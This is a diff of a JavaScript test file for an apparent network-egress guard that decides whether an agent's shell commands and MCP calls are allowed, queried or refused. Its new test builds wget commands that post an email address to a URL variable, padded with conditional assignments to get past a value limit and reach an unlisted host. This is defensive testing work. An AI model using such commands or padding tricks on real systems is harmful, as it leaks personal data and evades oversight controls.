@@ -253,6 +253,20 @@ test('config: egressAllowHosts skips listed hosts, exact or *.suffix', async (t)
   assert.equal((await mcp({ url: 'https://api.example.com', headers: { a: EMAIL } }, { home })).decision, 'none');
 });
 
+test('config: a URL variable past the value limit still asks for the hosts it may hold', async (t) => {
+  // The destructive rules are off so the line reaches the network check. Sixteen values on allowed hosts, then two past
+  // the limit on an unlisted host: the request still asks (the URL words are read as written, and past the limit the
+  // network check refuses to check only some values).
+  const home = homeWith(t, { egressAllowHosts: ['*.example.com'], blockDestructiveCommands: false });
+  const guards = [];
+  for (let i = 0; i < 15; i++) guards.push('[ -n "$A' + i + '" ] && U=https://h' + i + '.example.com/v1');
+  for (let i = 0; i < 2; i++) guards.push('[ -n "$B' + i + '" ] && U=https://other' + i + '.example.net/v1');
+  const cmd = 'U=https://api.example.com/v1; ' + guards.join('; ') + '; wget --post-data "mail=' + EMAIL + '" "$U"';
+  assert.equal((await bash(cmd, { home })).decision, 'ask');
+  const one = 'U=https://api.example.com/v1; [ -n "$A" ] && U=https://other.example.net/v1; wget --post-data "mail=' + EMAIL + '" "$U"';
+  assert.equal((await bash(one, { home })).decision, 'ask');
+});
+
 /* --------------------------- joined with other checks ------------------- */
 
 test('a placeholder in the arguments is refused before the egress check asks about the same command', async () => {
@@ -382,10 +396,11 @@ test('MCP: personal data in an object key of a call with a URL asks', async () =
   assert.equal((await mcp({ url: 'https://example.com/a', [JANE]: 'x' })).decision, 'ask');
 });
 
-test('MCP: personal data deeper than the walk, or after 2000 leaves, still asks', async () => {
+test('MCP: personal data after 2000 leaves still asks, and a call nested deeper than zn reads is refused', async () => {
   let deep = { note: 'contact ' + JANE };
   for (let i = 0; i < 9; i++) deep = { level: deep };
-  assert.equal((await mcp({ url: 'https://example.com/a', extra: deep })).decision, 'ask');
+  // Arguments zn cannot read to the end are refused before any question (the hooks cannot tell what a deep value names).
+  assert.equal((await mcp({ url: 'https://example.com/a', extra: deep })).decision, 'deny');
   const many = Array.from({ length: 2100 }, (_, i) => 'filler ' + i);
   assert.equal((await mcp({ url: 'https://example.com/a', items: many, last: 'contact ' + JANE })).decision, 'ask');
   assert.equal(policy.egressMcpCovers({ url: 'https://example.com/a', extra: deep }), false);
